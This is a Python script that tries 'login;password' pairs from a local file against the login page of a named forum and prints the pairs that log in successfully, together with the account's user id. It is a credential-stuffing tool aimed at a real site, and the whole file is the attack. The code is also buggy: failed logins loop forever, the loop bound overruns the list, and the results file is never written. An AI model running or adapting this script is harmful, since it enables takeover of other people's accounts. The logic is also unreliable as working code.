import time

import bs4
import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import re

session = requests.Session()

link = "https://www.martview-forum.com/login/login"
file = open('logins.txt').read().split('\n')
goods = open('good.txt', 'a+')
i=0
while i <= len(file):
    data = {
        'login': file[i].split(";")[1],
        'password': file[i].split(";")[2]
    }
    session.get(link)
    time.sleep(1.5)
    responce = session.post(link, data=data).text
    session.get(link)
    time.sleep(1.5)
    if not 'Incorrect password. Please try again.' in responce and not 'could not be found.' in responce:
        soup = BeautifulSoup(responce, 'html.parser')
        print(data)
        session.cookies.clear()
        i+=1
        try:
            id = soup.find('span', class_='avatar avatar--xxs')['data-user-id']
            print(id)
        except:
            print('noup')
goods.close()